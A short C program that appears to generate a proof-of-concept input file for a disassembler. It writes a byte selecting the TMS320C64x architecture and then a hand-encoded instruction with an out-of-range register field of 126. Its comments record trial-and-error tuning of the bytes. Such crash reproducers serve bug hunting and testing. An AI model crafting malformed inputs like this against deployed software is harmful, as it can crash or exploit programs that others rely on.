#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* First byte: 0x1B = 27 selects TMS320C64x architecture */
    fputc(0x1B, f);

    /* 4-byte instruction: try to encode ADD (ID 1) with register field = 126 */
    /* Based on the earlier attempt that produced ID 46 with bytes 0x00,0x00,0xE0,0x07 */
    /* That was little-endian 0x07E00000. To get ID 1 instead of 46, adjust bits 31-27 */
    /* ID 46 in binary: 101110, ID 1: 000001. Need to change bits accordingly */
    /* Try little-endian 0x07E00001 which sets low bits to 1 */
    fputc(0x01, f);
    fputc(0x00, f);
    fputc(0xE0, f);
    fputc(0x07, f);

    /* Second 4 bytes: zeros (NOP in parallel slot) */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);

    fclose(f);
    return 0;
}